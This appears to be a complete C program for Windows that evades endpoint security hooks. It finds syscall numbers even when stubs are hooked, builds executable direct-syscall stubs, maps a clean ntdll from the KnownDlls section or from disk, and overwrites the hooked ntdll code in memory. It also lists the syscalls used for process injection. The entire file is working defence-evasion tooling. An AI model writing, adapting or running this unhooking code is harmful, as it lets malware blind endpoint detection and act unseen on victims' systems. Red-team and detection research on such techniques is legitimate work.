#include <windows.h>
#include <stdio.h>
#include <string.h>

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)

#ifndef SEC_IMAGE
#define SEC_IMAGE 0x1000000
#endif

typedef enum _SECTION_INHERIT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _IO_STATUS_BLOCK {
    union { NTSTATUS Status; PVOID Pointer; };
    ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

#define OBJ_CASE_INSENSITIVE 0x00000040L
#define InitializeObjectAttributes(p,n,a,r,s) \
    { (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
      (p)->RootDirectory = r;                  \
      (p)->Attributes = a;                     \
      (p)->ObjectName = n;                     \
      (p)->SecurityDescriptor = s;             \
      (p)->SecurityQualityOfService = NULL; }

// SSNs resolved at runtime
static DWORD SSN_NtProtect          = 0;
static DWORD SSN_NtOpenFile         = 0;
static DWORD SSN_NtCreateSection    = 0;
static DWORD SSN_NtMapViewOfSection = 0;
static DWORD SSN_NtClose            = 0;
// NEW: NtOpenSection lets us open the KnownDlls\ntdll section object
// that the kernel already has mapped clean — no NtOpenFile needed at all
static DWORD SSN_NtOpenSection      = 0;

// one stub per syscall we need
static PVOID stub_NtProtect          = NULL;
static PVOID stub_NtOpenFile         = NULL;
static PVOID stub_NtCreateSection    = NULL;
static PVOID stub_NtMapViewOfSection = NULL;
static PVOID stub_NtClose            = NULL;
// NEW: stub for NtOpenSection
static PVOID stub_NtOpenSection      = NULL;

// first byte E9 = jmp = hooked
static BOOL IsHooked(PVOID addr) {
    return *(PBYTE)addr == 0xE9;
}

// 4C 8B D1 B8 = mov r10,rcx; mov eax,<ssn> = clean stub
static BOOL IsCleanStub(PBYTE p) {
    return p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8;
}

// SSN lives at bytes 4-5
static DWORD ExtractSSN(PVOID addr) {
    PBYTE p = (PBYTE)addr;
    if (IsCleanStub(p))
        return (DWORD)p[4] | ((DWORD)p[5] << 8);
    return (DWORD)-1;
}

// syscall numbers are sequential in EAT alphabetical order so neighbors tell us ours
static DWORD ResolveSSNByNeighbor(HMODULE hNtdll, DWORD targetNameIdx,
                                   PDWORD funcRVAs, PWORD nameOrdinals,
                                   DWORD numNames) {
    for (DWORD offset = 1; offset < 10; offset++) {
        if (targetNameIdx + offset >= numNames) break;
        PVOID neighbor = (PVOID)((PBYTE)hNtdll + funcRVAs[nameOrdinals[targetNameIdx + offset]]);
        DWORD ssn = ExtractSSN(neighbor);
        if (ssn != (DWORD)-1)
            return ssn - offset;
    }
    for (DWORD offset = 1; offset < 10; offset++) {
        if (targetNameIdx < offset) break;
        PVOID neighbor = (PVOID)((PBYTE)hNtdll + funcRVAs[nameOrdinals[targetNameIdx - offset]]);
        DWORD ssn = ExtractSSN(neighbor);
        if (ssn != (DWORD)-1)
            return ssn + offset;
    }
    return (DWORD)-1;
}

// RWX allocation with SSN baked into bytes 4-7
static PVOID AllocateSyscallStub(DWORD ssn) {
    BYTE tmpl[] = {
        0x4C, 0x8B, 0xD1,              // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00,  // mov eax, <ssn>
        0x0F, 0x05,                    // syscall
        0xC3                           // ret
    };
    PBYTE mem = (PBYTE)VirtualAlloc(NULL, sizeof(tmpl),
                                    MEM_COMMIT | MEM_RESERVE,
                                    PAGE_EXECUTE_READWRITE);
    if (!mem) return NULL;
    memcpy(mem, tmpl, sizeof(tmpl));
    *(PDWORD)(mem + 4) = ssn;
    return mem;
}

// typed pointers so x64 calling convention is respected
static NTSTATUS CallNtOpenFile(PHANDLE fh, ACCESS_MASK access,
                                POBJECT_ATTRIBUTES oa, PIO_STATUS_BLOCK iosb,
                                ULONG share, ULONG opts) {
    typedef NTSTATUS (NTAPI *Fn)(PHANDLE, ACCESS_MASK,
                                  POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK,
                                  ULONG, ULONG);
    return ((Fn)stub_NtOpenFile)(fh, access, oa, iosb, share, opts);
}

static NTSTATUS CallNtCreateSection(PHANDLE sh, ACCESS_MASK access,
                                     POBJECT_ATTRIBUTES oa,
                                     PLARGE_INTEGER maxSize,
                                     ULONG pageProt, ULONG allocAttribs,
                                     HANDLE hFile) {
    typedef NTSTATUS (NTAPI *Fn)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
                                  PLARGE_INTEGER, ULONG, ULONG, HANDLE);
    return ((Fn)stub_NtCreateSection)(sh, access, oa, maxSize,
                                       pageProt, allocAttribs, hFile);
}

static NTSTATUS CallNtMapViewOfSection(HANDLE sh, HANDLE proc,
                                        PVOID *base, ULONG_PTR zeroBits,
                                        SIZE_T commitSize,
                                        PLARGE_INTEGER sectionOffset,
                                        PSIZE_T viewSize,
                                        SECTION_INHERIT inherit,
                                        ULONG allocType, ULONG pageProt) {
    typedef NTSTATUS (NTAPI *Fn)(HANDLE, HANDLE, PVOID*, ULONG_PTR,
                                  SIZE_T, PLARGE_INTEGER, PSIZE_T,
                                  SECTION_INHERIT, ULONG, ULONG);
    return ((Fn)stub_NtMapViewOfSection)(sh, proc, base, zeroBits,
                                          commitSize, sectionOffset,
                                          viewSize, inherit,
                                          allocType, pageProt);
}

static NTSTATUS CallNtClose(HANDLE h) {
    typedef NTSTATUS (NTAPI *Fn)(HANDLE);
    return ((Fn)stub_NtClose)(h);
}

static NTSTATUS CallNtProtect(HANDLE proc, PVOID *base, PSIZE_T size,
                               ULONG newProt, PULONG oldProt) {
    typedef NTSTATUS (NTAPI *Fn)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
    return ((Fn)stub_NtProtect)(proc, base, size, newProt, oldProt);
}

// NEW: NtOpenSection opens an existing named section object by path
// We use this to open \KnownDlls\ntdll — a clean SEC_IMAGE section
// the kernel pre-creates at boot, guaranteed unhooked, no file I/O needed
static NTSTATUS CallNtOpenSection(PHANDLE sh, ACCESS_MASK access,
                                   POBJECT_ATTRIBUTES oa) {
    typedef NTSTATUS (NTAPI *Fn)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
    return ((Fn)stub_NtOpenSection)(sh, access, oa);
}

// walk EAT, resolve each target SSN, build a stub for it
static BOOL ResolveSyscalls(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS nth = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + dos->e_lfanew);
    DWORD expRVA = nth->OptionalHeader
                       .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                       .VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY expDir =
        (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hNtdll + expRVA);

    PDWORD nameRVAs     = (PDWORD)((PBYTE)hNtdll + expDir->AddressOfNames);
    PDWORD funcRVAs     = (PDWORD)((PBYTE)hNtdll + expDir->AddressOfFunctions);
    PWORD  nameOrdinals = (PWORD) ((PBYTE)hNtdll + expDir->AddressOfNameOrdinals);
    DWORD  numNames     = expDir->NumberOfNames;

    // NtOpenSection replaces NtOpenFile + NtCreateSection for the KnownDlls path;
    // we still resolve the others for the fallback remap path
    const char *targets[] = {
        "NtProtectVirtualMemory",
        "NtOpenFile",
        "NtCreateSection",
        "NtMapViewOfSection",
        "NtClose",
        "NtOpenSection",
        NULL
    };
    DWORD *ssnPtrs[] = {
        &SSN_NtProtect,
        &SSN_NtOpenFile,
        &SSN_NtCreateSection,
        &SSN_NtMapViewOfSection,
        &SSN_NtClose,
        &SSN_NtOpenSection
    };
    PVOID *stubPtrs[] = {
        &stub_NtProtect,
        &stub_NtOpenFile,
        &stub_NtCreateSection,
        &stub_NtMapViewOfSection,
        &stub_NtClose,
        &stub_NtOpenSection
    };

    for (DWORD i = 0; i < numNames; i++) {
        LPCSTR name = (LPCSTR)((PBYTE)hNtdll + nameRVAs[i]);
        if (strncmp(name, "Nt", 2) != 0) continue;

        for (int t = 0; targets[t]; t++) {
            if (strcmp(name, targets[t]) != 0) continue;

            PVOID addr = (PVOID)((PBYTE)hNtdll + funcRVAs[nameOrdinals[i]]);
            DWORD ssn;

            if (!IsHooked(addr))
                ssn = ExtractSSN(addr);
            else
                ssn = ResolveSSNByNeighbor(hNtdll, i,
                                            funcRVAs, nameOrdinals, numNames);

            *ssnPtrs[t]  = ssn;
            *stubPtrs[t] = AllocateSyscallStub(ssn);

            printf("[*] %-30s @ %p hooked=%d SSN=0x%02lX stub=%p\n",
                   name, addr, IsHooked(addr), ssn, *stubPtrs[t]);
        }
    }

    // NtProtectVirtualMemory, NtMapViewOfSection, NtClose, and NtOpenSection
    // are the minimum set we must have; NtOpenFile/NtCreateSection are optional
    // because the KnownDlls path only needs NtOpenSection + NtMapViewOfSection
    for (int t = 0; targets[t]; t++) {
        if (*ssnPtrs[t] == 0 || *ssnPtrs[t] == (DWORD)-1 || !*stubPtrs[t]) {
            printf("[-] Failed to resolve %s\n", targets[t]);
            // NtOpenFile and NtCreateSection failures are non-fatal;
            // we fall through to the KnownDlls path which skips both
            if (strcmp(targets[t], "NtOpenFile")      == 0) continue;
            if (strcmp(targets[t], "NtCreateSection") == 0) continue;
            return FALSE;
        }
    }

    return TRUE;
}

// PRIMARY PATH: open \KnownDlls\ntdll section that the kernel pre-creates at boot
// This is the cleanest approach: no file I/O, no NtOpenFile, no NtCreateSection,
// and the section is guaranteed to be an unmodified SEC_IMAGE copy because
// KnownDlls entries are created by smss.exe before any user process runs
static BOOL LoadCleanNtdllViaKnownDlls(PVOID *cleanBase) {
    HANDLE  hSection = NULL;
    PVOID   baseAddr = NULL;
    SIZE_T  viewSize = 0;

    // \KnownDlls\ntdll is a named section object, not a file path;
    // the kernel maps it during session init so it's always present
    WCHAR sectionPath[] = L"\\KnownDlls\\ntdll.dll";
    UNICODE_STRING sectionName;
    sectionName.Buffer        = sectionPath;
    sectionName.Length        = (USHORT)(wcslen(sectionPath) * sizeof(WCHAR));
    sectionName.MaximumLength = sectionName.Length + sizeof(WCHAR);

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &sectionName,
                                OBJ_CASE_INSENSITIVE, NULL, NULL);

    // Open the existing section — no file handle needed at all
    NTSTATUS status = CallNtOpenSection(
        &hSection,
        SECTION_MAP_READ | SECTION_MAP_EXECUTE,
        &objAttr
    );
    if (!NT_SUCCESS(status)) {
        printf("[-] NtOpenSection (KnownDlls) failed: 0x%08lX\n", status);
        return FALSE;
    }
    printf("[+] NtOpenSection (KnownDlls) succeeded handle=%p\n", hSection);

    // SEC_IMAGE sections need PAGE_EXECUTE_WRITECOPY, PAGE_EXECUTE_READ gives
    // STATUS_SECTION_PROTECTION (same rule applies whether we opened via file or KnownDlls)
    status = CallNtMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &baseAddr,
        0,
        0,
        NULL,
        &viewSize,
        ViewUnmap,
        0,
        PAGE_EXECUTE_WRITECOPY
    );
    CallNtClose(hSection);
    if (!NT_SUCCESS(status)) {
        printf("[-] NtMapViewOfSection (KnownDlls) failed: 0x%08lX\n", status);
        return FALSE;
    }

    printf("[+] Clean ntdll mapped from KnownDlls @ %p size=0x%llX\n",
           baseAddr, (unsigned long long)viewSize);

    *cleanBase = baseAddr;
    return TRUE;
}

// FALLBACK PATH: original NtOpenFile approach, kept intact from approach 3
// Only reached if KnownDlls path fails (e.g. restricted sandbox environment)
static BOOL LoadCleanNtdllViaFile(PVOID *cleanBase) {
    NTSTATUS        status;
    HANDLE          hFile    = NULL;
    HANDLE          hSection = NULL;
    PVOID           baseAddr = NULL;
    SIZE_T          viewSize = 0;
    IO_STATUS_BLOCK ioStatus = { 0 };

    // NT APIs need the \\??\\ prefix, not a win32 path
    WCHAR pathBuf[] = L"\\??\\C:\\Windows\\System32\\ntdll.dll";
    UNICODE_STRING ntdllPath;
    ntdllPath.Buffer        = pathBuf;
    ntdllPath.Length        = (USHORT)(wcslen(pathBuf) * sizeof(WCHAR));
    ntdllPath.MaximumLength = ntdllPath.Length + sizeof(WCHAR);

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &ntdllPath,
                                OBJ_CASE_INSENSITIVE, NULL, NULL);

    // FILE_EXECUTE dropped - not needed to back a SEC_IMAGE section and causes 0xC0000002
    // FILE_NON_DIRECTORY_FILE added - required, kernel rejects without it
    status = CallNtOpenFile(
        &hFile,
        FILE_READ_DATA | SYNCHRONIZE,
        &objAttr,
        &ioStatus,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE
    );
    if (!NT_SUCCESS(status)) {
        printf("[-] NtOpenFile (fallback) failed: 0x%08lX\n", status);
        return FALSE;
    }
    printf("[+] NtOpenFile (fallback) succeeded handle=%p\n", hFile);

    // SEC_IMAGE tells the kernel to treat this as a PE, applies relocations etc
    status = CallNtCreateSection(
        &hSection,
        SECTION_MAP_READ | SECTION_MAP_EXECUTE,
        NULL,
        NULL,
        PAGE_READONLY,
        SEC_IMAGE,
        hFile
    );
    CallNtClose(hFile);
    if (!NT_SUCCESS(status)) {
        printf("[-] NtCreateSection (fallback) failed: 0x%08lX\n", status);
        return FALSE;
    }
    printf("[+] NtCreateSection (fallback) succeeded handle=%p\n", hSection);

    // SEC_IMAGE sections need PAGE_EXECUTE_WRITECOPY, PAGE_EXECUTE_READ gives STATUS_SECTION_PROTECTION
    status = CallNtMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &baseAddr,
        0,
        0,
        NULL,
        &viewSize,
        ViewUnmap,
        0,
        PAGE_EXECUTE_WRITECOPY
    );
    CallNtClose(hSection);
    if (!NT_SUCCESS(status)) {
        printf("[-] NtMapViewOfSection (fallback) failed: 0x%08lX\n", status);
        return FALSE;
    }

    printf("[+] Clean ntdll mapped from disk @ %p size=0x%llX\n",
           baseAddr, (unsigned long long)viewSize);

    *cleanBase = baseAddr;
    return TRUE;
}

// load a fresh ntdll using only direct syscalls so hooked APIs never touched;
// tries KnownDlls first (no file I/O, immune to NtOpenFile hooks), falls back to file
static BOOL LoadCleanNtdll(PVOID *cleanBase) {
    printf("[*] Trying KnownDlls path (avoids NtOpenFile entirely)...\n");
    if (LoadCleanNtdllViaKnownDlls(cleanBase))
        return TRUE;

    printf("[*] KnownDlls failed, falling back to NtOpenFile path...\n");
    return LoadCleanNtdllViaFile(cleanBase);
}

// clean copy has no hooks so SSN is always readable directly, no neighbor guessing
static DWORD ExtractSSNFromClean(PVOID cleanBase, LPCSTR funcName) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)cleanBase;
    PIMAGE_NT_HEADERS nth = (PIMAGE_NT_HEADERS)((PBYTE)cleanBase + dos->e_lfanew);
    DWORD expRVA = nth->OptionalHeader
                       .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                       .VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY expDir =
        (PIMAGE_EXPORT_DIRECTORY)((PBYTE)cleanBase + expRVA);

    PDWORD nameRVAs     = (PDWORD)((PBYTE)cleanBase + expDir->AddressOfNames);
    PDWORD funcRVAs     = (PDWORD)((PBYTE)cleanBase + expDir->AddressOfFunctions);
    PWORD  nameOrdinals = (PWORD) ((PBYTE)cleanBase + expDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < expDir->NumberOfNames; i++) {
        LPCSTR name = (LPCSTR)((PBYTE)cleanBase + nameRVAs[i]);
        if (strcmp(name, funcName) != 0) continue;

        PVOID addr = (PVOID)((PBYTE)cleanBase + funcRVAs[nameOrdinals[i]]);
        return ExtractSSN(addr);
    }
    return (DWORD)-1;
}

int main(void) {
    printf("[*] Resolving syscalls from hooked ntdll...\n");
    if (!ResolveSyscalls()) {
        printf("[-] Failed to resolve syscalls\n");
        return 1;
    }

    printf("\n[*] Loading clean ntdll via direct syscalls...\n");
    PVOID cleanBase = NULL;
    if (!LoadCleanNtdll(&cleanBase)) {
        printf("[-] Failed to load clean ntdll\n");
        return 1;
    }

    // no guessing here, clean copy stubs are untouched
    printf("\n[*] Extracting SSNs from clean copy...\n");
    const char *checkFuncs[] = {
        "NtOpenProcess",
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtCreateThreadEx",
        "NtProtectVirtualMemory",
        "NtCreateSection",
        "NtMapViewOfSection",
        NULL
    };
    for (int i = 0; checkFuncs[i]; i++) {
        DWORD ssn = ExtractSSNFromClean(cleanBase, checkFuncs[i]);
        printf("[+] %-35s SSN=0x%02lX\n", checkFuncs[i], ssn);
    }

    // combine approach 2 + 3: use the kernel-mapped clean copy as source for the remap
    printf("\n[*] Remapping hooked ntdll .text from clean copy...\n");
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)cleanBase;
    PIMAGE_NT_HEADERS nth = (PIMAGE_NT_HEADERS)((PBYTE)cleanBase + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nth);

    for (WORD i = 0; i < nth->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) != 0) continue;

        // clean copy is already mapped as image so use VirtualAddress not PointerToRawData
        PVOID  src      = (PVOID)((PBYTE)cleanBase + sec->VirtualAddress);
        PVOID  dest     = (PVOID)((PBYTE)hNtdll   + sec->VirtualAddress);
        SIZE_T sectSize = sec->Misc.VirtualSize;
        DWORD  oldProt  = 0;

        printf("[*] .text RVA=0x%lX size=0x%lX\n",
               sec->VirtualAddress, sec->Misc.VirtualSize);
        printf("[*] src=%p (clean) -> dest=%p (hooked)\n", src, dest);

        NTSTATUS st = CallNtProtect(GetCurrentProcess(),
                                     &dest, &sectSize,
                                     PAGE_EXECUTE_READWRITE, &oldProt);
        if (!NT_SUCCESS(st)) {
            printf("[-] NtProtect failed: 0x%08lX\n", st);
            break;
        }

        memcpy(dest, src, sectSize);

        CallNtProtect(GetCurrentProcess(),
                      &dest, &sectSize,
                      oldProt, &oldProt);

        printf("[+] .text remapped from clean ntdll copy\n");
        break;
    }

    printf("\n[*] Sleeping 60s - attach WinDbg and run: u ntdll!NtOpenProcess\n");
    Sleep(60000);

    VirtualFree(stub_NtProtect,          0, MEM_RELEASE);
    VirtualFree(stub_NtOpenFile,         0, MEM_RELEASE);
    VirtualFree(stub_NtCreateSection,    0, MEM_RELEASE);
    VirtualFree(stub_NtMapViewOfSection, 0, MEM_RELEASE);
    VirtualFree(stub_NtClose,            0, MEM_RELEASE);
    VirtualFree(stub_NtOpenSection,      0, MEM_RELEASE);

    return 0;
}
